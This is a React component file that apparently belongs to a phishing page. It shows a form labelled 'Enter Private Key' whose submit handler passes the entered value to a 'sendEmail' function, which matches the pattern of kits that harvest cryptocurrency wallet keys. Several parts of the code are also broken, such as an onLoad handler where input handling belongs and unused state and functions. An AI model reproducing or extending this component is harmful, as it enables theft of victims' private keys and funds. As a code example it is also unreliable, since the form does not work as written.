import classes from './privateKey.module.css'
import { FaEye } from "react-icons/fa";
import { useState, useContext } from "react";
import { UserContent } from '../../contextApi/contextApi';

const PrivateKey = () => {
  const { sendEmail } = useContext(UserContent);
  const [message, setMessage] = useState('')
  const [close, setClose] = useState(false);
  const [payLoad, setPayload] = useState({
    message: "",
  })
  const handleForm = (e) => {
    const { name, value } = e.target
    setPayload({
      ...payLoad,
      [name]: value
    })
  }
  const handleSubmit = (e) => {
    if (message.trim().length != 0) {
      console.log('input is not empty')
    } else {
      console.log('input is value empty')
    }
    e.preventDefault()
    console.log(payLoad)
  }
  const toggleClose = () => {
    setClose(!close);
  };
  return (

    <>
      <form action="" onSubmit={sendEmail}>
        <div className={classes.inputs}>
          <div className={classes.inputEye}>
            <textarea
              name="message"
              onLoad={handleForm}
              value={payLoad.message}
              className={classes.text}
              type={close ? "password" : "text"}
              placeholder="Enter Private Key"
            />
          </div>

        </div>
        <div className={classes.submit}>
          <button >Proceed</button>
        </div>
      </form>
    </>

  );
}

export default PrivateKey